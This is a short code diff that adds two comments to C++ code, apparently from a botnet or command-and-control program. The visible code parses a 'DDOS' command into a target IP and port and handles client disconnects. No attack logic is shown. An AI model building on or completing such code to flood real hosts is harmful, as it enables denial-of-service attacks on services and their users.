@@ -96,6 +96,7 @@ int main() {
 			break;
 		case DDOS:
 		{
+			/* DDOS STAGE */
 			std::vector<std::string> splittedCmd = split(cmd, ' ');
 			std::string ip = splittedCmd[1];
 			std::string sPort = splittedCmd[2];
@@ -257,6 +258,8 @@ void ClientThread(SOCKET sock, std::string ip) {
 	while (bConnected) {
 		char buffer[1];
 		recv(sock, buffer, sizeof(buffer), 0);
+
+		/* DISCONNECT STAGE */
 		if ((UINT)buffer[0] == DISCONNECT) {
 			Disconnect(ip);
 			bConnected = false;
